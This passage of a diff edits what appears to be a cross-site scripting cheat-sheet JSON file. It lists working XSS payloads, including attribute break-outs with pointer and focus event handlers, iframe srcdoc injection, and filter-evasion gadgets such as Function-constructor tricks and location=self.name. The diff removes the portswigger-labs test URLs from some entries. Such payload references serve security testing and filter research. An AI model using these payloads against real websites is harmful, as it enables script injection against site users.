     "code": "\"/onpointermove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonpointermove%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointerover (slash-sep) (attribute_double)",
     "code": "\"/onpointerover=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonpointerover%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointerrawupdate (slash-sep) (attribute_double)",
     "code": "\"/onpointerrawupdate=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonpointerrawupdate%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onmousedown (slash-sep) (attribute_double)",
     "code": "\"/onmousedown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonmousedown%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onmouseup (slash-sep) (attribute_double)",
     "code": "\"/onmouseup=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonmouseup%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointerdown (slash-sep) (attribute_double)",
     "code": "\"/onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonpointerdown%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointerdown (slash-sep) (attribute_double) #2",
     "code": "\"/onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonpointerdown%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onfocus (slash-sep) +autofocus (attribute_double)",
     "code": "\"/onfocus=alert(1) autofocus/",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonfocus%3Dalert%281%29%20autofocus%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onfocusin (slash-sep) +autofocus (attribute_double)",
     "code": "\"/onfocusin=alert(1) autofocus/",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonfocusin%3Dalert%281%29%20autofocus%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onmousemove (slash-sep) (attribute_double) #2",
     "code": "\"/onmousemove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonmousemove%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onmouseenter (slash-sep) (attribute_double) #2",
     "code": "\"/onmouseenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonmouseenter%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointerenter (slash-sep) (attribute_double) #2",
     "code": "\"/onpointerenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonpointerenter%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointermove (slash-sep) (attribute_double) #2",
     "code": "\"/onpointermove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonpointermove%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointerover (slash-sep) (attribute_double) #2",
     "code": "\"/onpointerover=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonpointerover%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointerrawupdate (slash-sep) (attribute_double) #2",
     "code": "\"/onpointerrawupdate=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonpointerrawupdate%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onmousedown (slash-sep) (attribute_double) #2",
     "code": "\"/onmousedown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonmousedown%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onmouseup (slash-sep) (attribute_double) #2",
     "code": "\"/onmouseup=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonmouseup%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointerdown (slash-sep) (attribute_double) #3",
     "code": "\"/onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonpointerdown%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointerdown (slash-sep) (attribute_double) #4",
     "code": "\"/onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonpointerdown%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onfocus (unquoted) +autofocus (attribute_unquoted)",
     "code": "1 onfocus=alert(1) autofocus/",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=1%20onfocus%3Dalert%281%29%20autofocus%2F",
     "context": "attribute_unquoted"
   },
   {
     "description": "attribute break-out with onfocusin (unquoted) +autofocus (attribute_unquoted)",
     "code": "1 onfocusin=alert(1) autofocus/",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=1%20onfocusin%3Dalert%281%29%20autofocus%2F",
     "context": "attribute_unquoted"
   },
   {
     "description": "attribute break-out with onmousemove (unquoted) (attribute_unquoted)",
     "code": "1 onmousemove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=1%20onmousemove%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_unquoted"
   },
   {
     "description": "attribute break-out with onmouseenter (unquoted) (attribute_unquoted)",
     "code": "1 onmouseenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=1%20onmouseenter%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_unquoted"
   },
   {
     "description": "attribute break-out with onpointerenter (unquoted) (attribute_unquoted)",
     "code": "1 onpointerenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=1%20onpointerenter%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_unquoted"
   },
   {
     "description": "attribute break-out with onpointermove (unquoted) (attribute_unquoted)",
     "code": "1 onpointermove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=1%20onpointermove%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_unquoted"
   },
   {
     "description": "attribute break-out with onpointerover (unquoted) (attribute_unquoted)",
     "code": "1 onpointerover=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=1%20onpointerover%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_unquoted"
   },
   {
     "description": "attribute break-out with onpointerrawupdate (unquoted) (attribute_unquoted)",
     "code": "1 onpointerrawupdate=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=1%20onpointerrawupdate%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_unquoted"
   },
   {
     "description": "attribute break-out with onpointerrawupdate (unquoted) (attribute_unquoted) #2",
     "code": "1 onpointerrawupdate=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=1%20onpointerrawupdate%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_unquoted"
   },
   {
     "description": "attribute break-out with onmouseup (unquoted) (attribute_unquoted)",
     "code": "1 onmouseup=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=1%20onmouseup%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_unquoted"
   },
   {
     "description": "attribute break-out with onpointerdown (unquoted) (attribute_unquoted)",
     "code": "1 onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=1%20onpointerdown%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_unquoted"
   },
   {
     "description": "attribute break-out with onfocus (quoted-handler) +autofocus (attribute_double)",
     "code": "\"onfocus=\"alert(1)\"/autofocus/",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22onfocus%3D%22alert%281%29%22%2Fautofocus%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onfocusin (quoted-handler) +autofocus (attribute_double)",
     "code": "\"onfocusin=\"alert(1)\"/autofocus/",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22onfocusin%3D%22alert%281%29%22%2Fautofocus%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onmousemove (quoted-handler) (attribute_double)",
     "code": "\"onmousemove=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22onmousemove%3D%22alert%281%29%22style%3D%22position%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%22%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onmouseenter (quoted-handler) (attribute_double)",
     "code": "\"onmouseenter=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22onmouseenter%3D%22alert%281%29%22style%3D%22position%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%22%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointerenter (quoted-handler) (attribute_double)",
     "code": "\"onpointerenter=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22onpointerenter%3D%22alert%281%29%22style%3D%22position%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%22%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointermove (quoted-handler) (attribute_double)",
     "code": "\"onpointermove=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22onpointermove%3D%22alert%281%29%22style%3D%22position%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%22%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointerover (quoted-handler) (attribute_double)",
     "code": "\"onpointerover=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22onpointerover%3D%22alert%281%29%22style%3D%22position%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%22%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointerrawupdate (quoted-handler) (attribute_double)",
     "code": "\"onpointerrawupdate=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22onpointerrawupdate%3D%22alert%281%29%22style%3D%22position%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%22%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onmouseup (quoted-handler) (attribute_double)",
     "code": "\"onmouseup=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22onmouseup%3D%22alert%281%29%22style%3D%22position%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%22%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointerdown (quoted-handler) (attribute_double)",
     "code": "\"onpointerdown=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22onpointerdown%3D%22alert%281%29%22style%3D%22position%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%22%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "javascript: URL (iframe_src)",
     "code": "\" srcdoc=\"<xss tabindex=1 autofocus onfocusin=alert(1)>\"",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%20srcdoc%3D%22%3Cxss%20tabindex%3D1%20autofocus%20onfocusin%3Dalert%281%29%3E%22",
     "context": "iframe_src"
   },
   {
     "description": "<xss> with onfocus using atob.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=atob.constructor('a'+'lert(1)')()>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Datob.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using btob.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=btob.constructor('a'+'lert(1)')()>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dbtob.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using Ink.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=Ink.constructor('a'+'lert(1)')()>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3DInk.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using HID.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=HID.constructor('a'+'lert(1)')()>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3DHID.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using GPU.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=GPU.constructor('a'+'lert(1)')()>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3DGPU.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using when.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=when.constructor('a'+'lert(1)')()>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dwhen.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using find.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=find.constructor('a'+'lert(1)')()>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dfind.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using print.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=print.constructor('a'+'lert(1)')()>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dprint.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using Set.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=Set.constructor('a'+'lert(1)')()>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3DSet.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using {}.constructor.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus={}.constructor.constructor('a'+'lert(1)')()>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3D%7B%7D.constructor.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using ''.constructor.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=''.constructor.constructor('a'+'lert(1)')()>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3D%27%27.constructor.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using [].constructor.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=[].constructor.constructor('a'+'lert(1)')()>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3D%5B%5D.constructor.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using 0..constructor.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=0..constructor.constructor('a'+'lert(1)')()>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3D0..constructor.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using 0n.constructor.constructor() (html)",
     "code": "<xss tabindex=1 autofocus onfocus=0n.constructor.constructor('a'+'lert(1)')()>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3D0n.constructor.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using createElement('script')+append (html)",
     "code": "<xss tabindex=1 autofocus onfocus=s=createElement('script'),s.append('a'+'lert(1)'),this.append(s)>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Ds%3DcreateElement%28%27script%27%29%2Cs.append%28%27a%27%2B%27lert%281%29%27%29%2Cthis.append%28s%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using location.replace(javascript:) (html)",
     "code": "<xss tabindex=1 autofocus onfocus=location.replace('javascript:a\\lert(1)')>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dlocation.replace%28%27javascript%3Aa%5Clert%281%29%27%29%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using location='javascript:a\\lert(1)' (html)",
     "code": "<xss tabindex=1 autofocus onfocus=location='javascript:a\\lert(1)'>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dlocation%3D%27javascript%3Aa%5Clert%281%29%27%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using location=self.name (html)",
     "code": "<xss tabindex=1 autofocus onfocus=location=self.name>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dlocation%3Dself.name%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using location=frames.name (html)",
     "code": "<xss tabindex=1 autofocus onfocus=location=frames.name>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dlocation%3Dframes.name%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using location=globalThis.name (html)",
     "code": "<xss tabindex=1 autofocus onfocus=location=globalThis.name>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20tabindex%3D1%20autofocus%20onfocus%3Dlocation%3DglobalThis.name%3E"
+    "browsers": ["chrome", "firefox", "edge", "safari"]
   },
   {
     "description": "<xss> with onfocus using location=globalThis.name (html) #2",
     "code": "<xss tabindex=1 autofocus onfocus=location=globalThis.name>",
-    "browsers": ["chrome", "firefox", "edge", "safari"],
